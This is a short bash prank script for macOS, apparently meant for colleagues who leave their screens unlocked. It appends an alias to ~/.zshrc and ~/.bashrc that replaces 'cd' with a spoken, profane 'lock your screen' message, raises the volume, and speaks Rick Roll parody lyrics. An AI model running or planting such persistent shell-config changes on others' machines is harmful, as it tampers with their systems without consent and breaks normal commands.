#!/bin/bash

current_user=$(whoami)

# Check if the username is not "jgotz"
if [ "$1" != "test" ]; then
    echo 'alias cd="osascript -e '\''set Volume 3'\'' && say '\''Lock your fucking screen'\''"' >> ~/.zshrc
	echo 'alias cd="osascript -e '\''set Volume 3'\'' && say '\''Lock your fucking screen'\''"' >> ~/.bashrc
else
    echo "Testmode. Skipping the code."
fi


if [ "$1" != "test" ]; then
    osascript -e "set Volume 10"
else
    osascript -e "set Volume 0"
fi

# Define the lyrics of the Rick Roll song with pauses
lyrics=(
  "Never gonna lock your screen,"
  "Never gonna let this stop,"
  "Never gonna run around and desert you,"
  "Never gonna make you lock your fucking screen,"
  "Never gonna say goodbye,"
  "Never gonna tell you why you didn't lock your fucking screen"
)
function_name () {
  	# Loop through each line of lyrics and use 'say' to vocalize them
	for line in "${lyrics[@]}"; do
	say "$line"
	done
}

if [ "$1" != "test" ]; then
    function_name &
fi

curl ascii.live/rick